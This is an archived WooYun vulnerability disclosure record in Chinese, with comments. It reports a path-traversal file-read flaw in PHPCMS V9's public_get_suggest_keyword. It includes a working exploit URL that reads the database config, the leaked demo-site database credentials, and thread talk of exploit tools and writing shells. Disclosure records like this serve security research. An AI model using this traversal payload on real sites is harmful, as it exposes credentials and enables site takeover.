{"id": 18756, "wybug_id": "wooyun-2012-010072", "wybug_title": "Phpcms V9 直接爆密", "wybug_corp": "phpcms", "wybug_author": "性感的蛐蛐", "wybug_date": "2012-07-24 10:44", "wybug_open_date": "2012-07-29 10:45", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPCMS V9直接爆密码！！ 详细说明：  没啥想解释的直接上地址吧:http://v9.demo.phpcms.cn/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php没啥想解释的,好像有点蛋疼了,<?phpreturn array (\t'default' => array (\t\t'hostname' => '10.150.10.77',\t\t'database' => 'v9_demo_phpcms_cn',\t\t'username' => 'v9_demo_phpcms_c',\t\t'password' => 'KJhSLKHSKJ25423',\t\t'tablepre' => 'v9_sso_',\t\t'charset' => 'gbk',\t\t'type' => 'mysql',\t\t'debug' => true,\t\t'pconnect' => 0,\t\t'autoconnect' => 0\t\t));?>   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 性感的蛐蛐@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-07-29 10:45 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-24 11:22 |    \t\tking \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 喜爱安全，网络游戏安全应用漏洞挖掘)\t\t \n  \tpublic function public_get_suggest_keyword() {\t\t$url = $_GET['url'].'&q='.$_GET['q'];\t\t$trust_url = array('c8430fcf851e85818b546addf5bc4dd3');\t\t$urm_md5 = md5($url);\t\tif (!in_array($urm_md5, $trust_url)) exit;\t\t\t\t$res = @file_get_contents($url);\t\tif(CHARSET != 'gbk') {\t\t\t$res = iconv('gbk', CHARSET, $res);\t\t}\t\techo $res;\t}    \n     2012-07-24 12:34 |    \t\tf19ht \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:15        | 依依不舍的还是你的菊花。)\t\t \n  继续关注。。。    \n     2012-07-24 12:52 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  刚才在某群里看到细节了，    \n     2012-07-24 13:00 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @king $trust_url = array('c8430fcf851e85818b546addf5bc4dd3')固定的吗?    \n     2012-07-24 14:08 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @pangshenjie 求    \n     2012-07-24 16:48 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  c8430fcf851e85818b546addf5bc4dd3 是啥米东西？后门？    \n     2012-07-24 18:17 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  据说V9站点统统出现传说中的username 和 password 诶，只能说强大的phpcms    \n     2012-07-24 18:29 |    \t\t腰上有胸器 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:5        | 一根带刺的黄瓜和一个女人的故事。)\t\t \n  @f19ht @性感的蛐蛐 @数据流 http://madman.in/madman6/796.htm貌似这个工具都出来了。    \n     2012-07-24 18:32 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @腰上有胸器 日..看样子应该是任意文件下载吧    \n     2012-07-24 19:52 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @数据流 据说仁兄一日一注入?    \n     2012-07-24 20:34 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @性感的蛐蛐 嘻嘻 没有啦..一日一射而已    \n     2012-07-24 20:54 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @数据流 但愿仁兄,细水长流! 你懂的!    \n     2012-07-24 21:06 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @性感的蛐蛐 懂``哈    \n     2012-07-25 01:24 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @数据流 我看到的细节是任意文件下载。    \n     2012-07-25 03:09 |    \t\tCreturn \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 静下心来，做自己想做的事情!)\t\t \n  @腰上有胸器 额，貌似我写的晚了点，类似利用工具http://www.creturn.com/phpcmsv9%E6%9C%80%E6%96%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7    \n     2012-07-25 14:35 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @Creturn 我已经通知官方修复了,呵呵    \n     2012-07-25 14:42 |    \t\t波波虎 \t\t\t( 普通白帽子  |\t\t\t        Rank:266 漏洞数:51        | 11111111111)\t\t \n  任意文件下载,影响一大片了    \n     2012-07-25 14:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @性感的蛐蛐 我刚刚下载还没有修复    \n     2012-07-25 15:30 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @xsser 他们可以吃屎去了,呵呵,第一次看见这么不积极的官方,我跟他们客服联系的时候,架子大的很,以后PHPCMS出问题,让大家脱去吧,绝对不会再通知他们官方的!    \n     2012-07-25 15:31 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @波波虎 人家觉得洞洞不重要,不需要修补,告诉我了两句话\"这个漏洞 很早就修复了  可能是有些程序没打补丁\"我说是官网爆出来的,他回答\"嗯  那个演示站点没升级  我以告知技术 了\"    \n     2012-07-25 15:35 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @性感的蛐蛐 乌云上一个漏洞也被忽略了 乌云已经发微博警告了    \n     2012-07-25 15:42 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @xsser 亲,这漏洞不重要,才泄漏了,database,DataBase,UserName,Password 而已!哈哈,    \n     2012-07-25 15:49 |    \t\t波波虎 \t\t\t( 普通白帽子  |\t\t\t        Rank:266 漏洞数:51        | 11111111111)\t\t \n  ...............这个很严重，直接拿站,这下站长要蛋碎了    \n     2012-07-25 15:57 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  @洞主 这不是我发的洞么？http://zone.wooyun.org/content/555    \n     2012-07-25 15:58 |    \t\tleehenwu \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:24        | 撸·啊·撸)\t\t \n  外连直接导数据，内连直接写shell    \n     2012-07-25 17:03 |    \t\tCreturn \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 静下心来，做自己想做的事情!)\t\t \n  @Zvall  原来早就爆了    \n     2012-07-25 17:07 |    \t\tCreturn \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 静下心来，做自己想做的事情!)\t\t \n  @leehenwu 内联直接写shell 还是那个地方？分析下，不行就来求指导    \n     2012-07-25 19:04 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @Zvall 汗颜,不好意思,真没注意到,那联系官方删了该条吧,.....乌云什么时候多了个zone.wooyun.org啊?以前怎么没注意到?    \n     2012-07-26 10:22 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php    \n     2012-07-26 11:33 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  @性感的蛐蛐 那些企业都这样    \n     2012-07-26 17:29 |    \t\tCreturn \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 静下心来，做自己想做的事情!)\t\t \n  @leehenwu 大牛内联直接写shell怎么搞？小菜我研究几天硬是没结果？    \n     2012-07-29 12:35 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  外部关联：关于此漏洞的更新包：http://bbs.phpcms.cn/thread-621649-1-1.html    \n     2012-07-29 14:26 |    \t\tCCOz \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:7        | 本人还是处，有意的富婆请联系我，五万以下...)\t\t \n  http://www.ccoz.net/blog/91。。。    \n     2012-07-29 16:42 |    \t\tLittlePig \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | </html>)\t\t \n  @horseluke 忽略再修复？求wooyun封杀PHPCMS！    \n     2012-07-29 17:35 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @LittlePig 不是，从补丁发放来看，修复是在这个漏洞爆出之前的。    \n     2012-07-30 09:51 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @horseluke 厂商回应,无影响,直接忽略    \n     2012-08-30 17:26 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @leehenwu 大牛内连写SHELL怎么搞?求思路...    \n     2012-09-06 20:29 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  @性感的蛐蛐 楼主发布的时候，这个漏洞已经补啦。所以厂商忽略了。建议楼主挖洞之前到后台点击一下更新，很多时候补丁不马上放到官方那个下载链接里，但是后台可以打补丁。    \n     2012-09-11 09:11 |    \t\t性感的蛐蛐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 少年,母猪喊你回家拱地!)\t\t \n  @tenzy 呵呵,可能是吧,我当时发现的时候是在他们官方演示站发现的,所以就提交喽,如果说他们自己做完补丁官方演示站都没更新,那么你说有多少个用户关注了?诶,,,伤不起了,看大牛是职业PHPCMS 洞洞大牛?哈哈,发的都是他们的?    \n     2012-10-20 20:59 |    \t\tCnCxzSec(衰仔) \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:32        | Wow~~~)\t\t \n  这不是我和@xsser 七月份就在这下面说过了么…… WooYun: phpcms v9 Multiple Vulnerabilities    \n     2012-10-20 21:01 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @CnCxzSec(衰仔) 嗯 最后他做了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}